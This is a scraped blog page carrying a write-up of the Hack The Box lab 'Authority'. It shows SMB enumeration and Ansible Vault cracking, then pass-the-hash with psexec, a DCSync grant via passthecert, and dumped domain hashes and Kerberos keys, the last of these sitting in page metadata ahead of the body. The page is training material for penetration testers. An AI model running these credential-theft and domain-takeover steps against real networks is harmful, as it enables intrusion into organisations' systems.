AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:fd46a391cd96241d31c6cf3402c4c365::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81 Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f Administrator:des-cbc-md5:8ad3d50efed66b16 krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161 krbtgt:des-cbc-md5:a1457c268ca11919 svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96 svc_ldap:des-cbc-md5:01a8984920866862 AUTHORITY$:aes256-cts-hmac-sha1-96:d9eeaa12af484646fdc30d2a6d5b10abb90419f2d67636c0f225b98860ef8a67 AUTHORITY$:aes128-cts-hmac-sha1-96:988f7118e6216de57982e2ad1bf64bfc AUTHORITY$:des-cbc-md5:b031e9e34f4f497a [*] Cleaning up... We can get a system shell with psexec.py\n┌─[✗]─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed 'authority.htb/administrator@authority.htb' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra [*] Requesting shares on authority.htb..... [*] Found writable share ADMIN$ [*] Uploading file YgsLybRG.exe [*] Opening SVCManager on authority.htb..... [*] Creating service kcZG on authority.htb..... [*] Starting service kcZG..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.4644] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003e whoami nt authority\\system C:\\Windows\\system32\u003e Or we can give DCSYNC rights to the user with passthecert.py and dump domain hashes.\n(venv) ┌─[✗]─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222 -target 'svc_ldap' -elevate Impacket v0.11.0 - Copyright 2023 Fortra [*] Granted user 'svc_ldap' DCSYNC rights! ┌─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $secretsdump.py 'svc_ldap:lDaP_1n_th3_cle4r!@authority.htb' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908::: svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1::: AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:fd46a391cd96241d31c6cf3402c4c365::: [--SNIP--] ","wordCount":"2969","inLanguage":"en","image":"//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-20T00:00:00Z","dateModified":"2025-11-20T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/posts/authority/"},"publisher":{"@type":"Organization","name":"Fieryrival's Blog","logo":{"@type":"ImageObject","url":"//localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=//localhost:1313/apple-touch-icon_hu_ca5ae87867264747.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=//localhost:1313/about/ title="About Me"><span>About</span></a></li><li><a href=//localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=//localhost:1313/posts/ title=posts><span>posts</span></a></li><li><a href=//localhost:1313/ title><span></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Becoming the Authority: An AD CS Exploit on HTB 'Authority'</h1><div class=post-meta><span title='2025-11-20 00:00:00 +0000 UTC'>November 20, 2025</span>&nbsp;·&nbsp;<span>14 min</span>&nbsp;·&nbsp;<span>2969 words</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#box-info>Box Info</a></li><li><a href=#recon>Recon</a><ul><li><a href=#nmap>Nmap</a></li></ul></li><li><a href=#smb-enumeration>SMB Enumeration</a><ul><li><a href=#readable-development-folder>Readable Development Folder</a></li><li><a href=#cracking-ansible-vault-secrets>Cracking Ansible Vault Secrets</a></li></ul></li><li><a href=#iis-default-page-at-tcp-80>IIS default page at TCP 80</a></li><li><a href=#pwm-at-port-8443>PWM at Port 8443</a></li><li><a href=#post-credential-enumeration>Post Credential Enumeration</a><ul><li><a href=#adcs-active-directory-certificate-services>ADCS (Active Directory Certificate Services)</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=authority>Authority<a hidden class=anchor aria-hidden=true href=#authority>#</a></h1><h2 id=box-info>Box Info<a hidden class=anchor aria-hidden=true href=#box-info>#</a></h2><p><img alt=Authority.png loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Authority.png></p><p>This was a medium-rated AD box created by <a href=https://app.hackthebox.com/profile/2984>mrb3n</a> and <a href=https://app.hackthebox.com/profile/206770>Sentinal920</a>. In this box, an Ansible Vault was utilized to extract credentials for PWM. These credentials were subsequently employed on a PWM instance. The PWM instance could be configured to manipulate LDAP authentication, coercing it into attacking a server to capture credentials. Following this, an exploitation of a vulnerable certificate template was carried out to gain domain administrator privileges.</p><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Tue Nov 28 14:55:35 2023 as: nmap -p- --min-rate 5000 -v -oN full -sV 10.10.11.222</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> authority.authority.htb <span class=o>(</span>10.10.11.222<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.051s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65505</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE    SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open     domain        Simple DNS Plus
</span></span><span class=line><span class=cl>80/tcp    open     http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl>88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2023-11-28 19:56:09Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open     msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp   open     microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp   open     kpasswd5?
</span></span><span class=line><span class=cl>593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl>8443/tcp  open     ssl/https-alt
</span></span><span class=line><span class=cl>9389/tcp  open     adws?
</span></span><span class=line><span class=cl>35744/tcp filtered unknown
</span></span><span class=line><span class=cl>47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl>47072/tcp filtered unknown
</span></span><span class=line><span class=cl>49058/tcp filtered unknown
</span></span><span class=line><span class=cl>49664/tcp open     unknown
</span></span><span class=line><span class=cl>49665/tcp open     tcpwrapped
</span></span><span class=line><span class=cl>49666/tcp open     unknown
</span></span><span class=line><span class=cl>49667/tcp open     msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49673/tcp open     unknown
</span></span><span class=line><span class=cl>49688/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49689/tcp open     unknown
</span></span><span class=line><span class=cl>49691/tcp open     unknown
</span></span><span class=line><span class=cl>49692/tcp open     unknown
</span></span><span class=line><span class=cl>49700/tcp open     msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49709/tcp open     unknown
</span></span><span class=line><span class=cl>49713/tcp open     unknown
</span></span><span class=line><span class=cl>49732/tcp open     unknown
</span></span><span class=line><span class=cl>Service Info: Host: AUTHORITY<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Tue Nov 28 14:57:36 2023 -- 1 IP address (1 host up) scanned in 121.58 seconds</span>
</span></span></code></pre></div><p>Several ports are open including DNS(53), Kerberos (88), SMB, LDAP, RPC, and WINRM. It&rsquo;s most likely a domain controller.</p><p>We can start with the automatic enumeration script enum4linux.py, It gives us the domain name, FQDN, and some information about the operating system and RPC port.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>--SNIP--<span class=o>]</span>
</span></span><span class=line><span class=cl> <span class=o>===========================================================</span>
</span></span><span class=line><span class=cl><span class=p>|</span>    Domain Information via SMB session <span class=k>for</span> 10.10.11.222    <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=o>===========================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Enumerating via unauthenticated SMB session on 445/tcp
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Found domain information via SMB
</span></span><span class=line><span class=cl>NetBIOS computer name: AUTHORITY
</span></span><span class=line><span class=cl>NetBIOS domain name: HTB
</span></span><span class=line><span class=cl>DNS domain: authority.htb
</span></span><span class=line><span class=cl>FQDN: authority.authority.htb
</span></span><span class=line><span class=cl>Derived membership: domain member
</span></span><span class=line><span class=cl>Derived domain: HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>--SNIP--<span class=o>]</span>
</span></span></code></pre></div><h2 id=smb-enumeration>SMB Enumeration<a hidden class=anchor aria-hidden=true href=#smb-enumeration>#</a></h2><p>We started with testing for a null session which was disabled, moving on to the guest session, where it was enabled.</p><p>Two shares i.e. Development and <code>IPC$</code> are readable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@81eb036f84ce:/usr/src/crackmapexec# cme smb 10.10.11.222 -u <span class=s1>&#39;guest&#39;</span> -p <span class=s1>&#39;&#39;</span> --shares
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:AUTHORITY<span class=o>)</span> <span class=o>(</span>domain:authority.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        <span class=o>[</span>+<span class=o>]</span> authority.htb<span class=se>\g</span>uest: 
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        <span class=o>[</span>*<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        C$                              Default share
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        Department Shares                 
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        Development     READ            
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        NETLOGON                        Logon server share
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        SYSVOL                          Logon server share
</span></span></code></pre></div><p>Since <code>IPC$</code> is readable we can attempt RID cycling.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@81eb036f84ce:/usr/src/crackmapexec# cme smb 10.10.11.222 -u <span class=s1>&#39;guest&#39;</span> -p <span class=s1>&#39;&#39;</span> --rid
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:AUTHORITY<span class=o>)</span> <span class=o>(</span>domain:authority.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        <span class=o>[</span>+<span class=o>]</span> authority.htb<span class=se>\g</span>uest: 
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        498: HTB<span class=se>\E</span>nterprise Read-only Domain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        500: HTB<span class=se>\A</span>dministrator <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        501: HTB<span class=se>\G</span>uest <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        502: HTB<span class=se>\k</span>rbtgt <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        512: HTB<span class=se>\D</span>omain Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        513: HTB<span class=se>\D</span>omain Users <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        514: HTB<span class=se>\D</span>omain Guests <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        515: HTB<span class=se>\D</span>omain Computers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        516: HTB<span class=se>\D</span>omain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        517: HTB<span class=se>\C</span>ert Publishers <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        518: HTB<span class=se>\S</span>chema Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        519: HTB<span class=se>\E</span>nterprise Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        520: HTB<span class=se>\G</span>roup Policy Creator Owners <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        521: HTB<span class=se>\R</span>ead-only Domain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        522: HTB<span class=se>\C</span>loneable Domain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        525: HTB<span class=se>\P</span>rotected Users <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        526: HTB<span class=se>\K</span>ey Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        527: HTB<span class=se>\E</span>nterprise Key Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        553: HTB<span class=se>\R</span>AS and IAS Servers <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        571: HTB<span class=se>\A</span>llowed RODC Password Replication Group <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        572: HTB<span class=se>\D</span>enied RODC Password Replication Group <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        1000: HTB<span class=se>\A</span>UTHORITY$ <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        1101: HTB<span class=se>\D</span>nsAdmins <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        1102: HTB<span class=se>\D</span>nsUpdateProxy <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>445</span>    AUTHORITY        1601: HTB<span class=se>\s</span>vc_ldap <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span></code></pre></div><p>After obtaining a list of users (in this case, we only have <code>svc_ldap</code>), we can attempt <code>AS-REProasting</code> to steal password hashes of users who have <code>Kerberos pre-authentication disabled</code>. However, there were no vulnerable accounts found.</p><h3 id=readable-development-folder>Readable Development Folder<a hidden class=anchor aria-hidden=true href=#readable-development-folder>#</a></h3><p>This folder had quite a good amount of files and folders which could have some sensitive info. So, let&rsquo;s download and have a look.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$smbclient</span> <span class=se>\\\\</span>10.10.11.222<span class=se>\\</span>Development -U <span class=s1>&#39;guest%&#39;</span>
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> dir
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Fri Mar <span class=m>17</span> 09:20:38 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Fri Mar <span class=m>17</span> 09:20:38 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  Automation                          D        <span class=m>0</span>  Fri Mar <span class=m>17</span> 09:20:40 <span class=m>2023</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>5888511</span> blocks of size 4096. <span class=m>1519101</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> prompt off
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> recurse on
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> mget *
</span></span></code></pre></div><p>Found and tested some credentials hardcoded for Tomcat but they were of no use to us.</p><p><img alt=Untitled loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Untitled.png></p><h3 id=cracking-ansible-vault-secrets>Cracking Ansible Vault Secrets<a hidden class=anchor aria-hidden=true href=#cracking-ansible-vault-secrets>#</a></h3><p>Sensitive information was discovered in the file <strong><code>Ansible/PWM/defaults/main.yml</code></strong> within the PWM folder. This file contained Ansible vault secrets.</p><p><code>Ansible vault</code> is a feature that allows users to keep sensitive data such as passwords or keys in encrypted files rather than plaintext in playbooks or roles. These vault files can then be distributed or placed in source control.</p><ul><li><p>Text from main.yml</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>pwm_run_dir: <span class=s2>&#34;{{ lookup(&#39;env&#39;, &#39;PWD&#39;) }}&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwm_hostname: authority.htb.corp
</span></span><span class=line><span class=cl>pwm_http_port: <span class=s2>&#34;{{ http_port }}&#34;</span>
</span></span><span class=line><span class=cl>pwm_https_port: <span class=s2>&#34;{{ https_port }}&#34;</span>
</span></span><span class=line><span class=cl>pwm_https_enable: <span class=nb>true</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwm_require_ssl: <span class=nb>false</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwm_admin_login: !vault <span class=p>|</span>
</span></span><span class=line><span class=cl>          <span class=nv>$ANSIBLE_VAULT</span><span class=p>;</span>1.1<span class=p>;</span>AES256
</span></span><span class=line><span class=cl>          <span class=m>32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
</span></span><span class=line><span class=cl>          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
</span></span><span class=line><span class=cl>          <span class=m>35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
</span></span><span class=line><span class=cl>          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
</span></span><span class=line><span class=cl>          <span class=m>3438</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwm_admin_password: !vault <span class=p>|</span>
</span></span><span class=line><span class=cl>          <span class=nv>$ANSIBLE_VAULT</span><span class=p>;</span>1.1<span class=p>;</span>AES256
</span></span><span class=line><span class=cl>          <span class=m>31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
</span></span><span class=line><span class=cl>          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
</span></span><span class=line><span class=cl>          <span class=m>38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
</span></span><span class=line><span class=cl>          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
</span></span><span class=line><span class=cl>          <span class=m>6531</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ldap_uri: ldap://127.0.0.1/
</span></span><span class=line><span class=cl>ldap_base_dn: <span class=s2>&#34;DC=authority,DC=htb&#34;</span>
</span></span><span class=line><span class=cl>ldap_admin_password: !vault <span class=p>|</span>
</span></span><span class=line><span class=cl>          <span class=nv>$ANSIBLE_VAULT</span><span class=p>;</span>1.1<span class=p>;</span>AES256
</span></span><span class=line><span class=cl>          <span class=m>63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
</span></span><span class=line><span class=cl>          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
</span></span><span class=line><span class=cl>          <span class=m>34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
</span></span><span class=line><span class=cl>          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
</span></span><span class=line><span class=cl>          <span class=m>3764</span>
</span></span></code></pre></div></li></ul><p>We can follow <a href=https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible#crack-the-vault>snovvcrash’s</a> article to crack the ansible vaults from our files.</p><p>First, we extracted the vault secrets in the proper format required for the next step.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$cat</span> h1 
</span></span><span class=line><span class=cl><span class=nv>$ANSIBLE_VAULT</span><span class=p>;</span>1.1<span class=p>;</span>AES256
</span></span><span class=line><span class=cl>326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
</span></span></code></pre></div><p>Then we need to convert it into hash which could be processed by hashcat.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/smb_development]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$</span><span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>share</span><span class=o>/</span><span class=nx>john</span><span class=o>/</span><span class=nx>ansible2john</span><span class=p>.</span><span class=nx>py</span> <span class=nx>h1</span> 
</span></span><span class=line><span class=cl><span class=nx>h1</span><span class=o>:</span><span class=nx>$ansible$0</span><span class=o>*</span><span class=mi>0</span><span class=o>*</span><span class=mi>2</span><span class=nx>fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d</span><span class=o>*</span><span class=nx>e041732f9243ba0484f582d9cb20e148</span><span class=o>*</span><span class=mi>4</span><span class=nx>d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8</span>
</span></span></code></pre></div><p>Note here I had to remove the filename i.e. <code>h1:</code> part and the file should only contain the hash.</p><p>We were then able to crack the vault password with <code>hashcat mode 16900</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>$ansible$0</span><span class=o>*</span><span class=mi>0</span><span class=o>*</span><span class=mi>2</span><span class=nx>fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d</span><span class=o>*</span><span class=nx>e041732f9243ba0484f582d9cb20e148</span><span class=o>*</span><span class=mi>4</span><span class=nx>d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8</span><span class=o>:!</span><span class=err>@#</span><span class=nx>$</span><span class=o>%^&amp;*</span>
</span></span><span class=line><span class=cl>                                                 
</span></span><span class=line><span class=cl><span class=nx>Session</span><span class=p>..........</span><span class=o>:</span> <span class=nx>hashcat</span>
</span></span><span class=line><span class=cl><span class=nx>Status</span><span class=p>...........</span><span class=o>:</span> <span class=nx>Cracked</span>
</span></span><span class=line><span class=cl><span class=nx>Hash</span><span class=p>.</span><span class=nx>Name</span><span class=p>........</span><span class=o>:</span> <span class=nx>Ansible</span> <span class=nx>Vault</span>
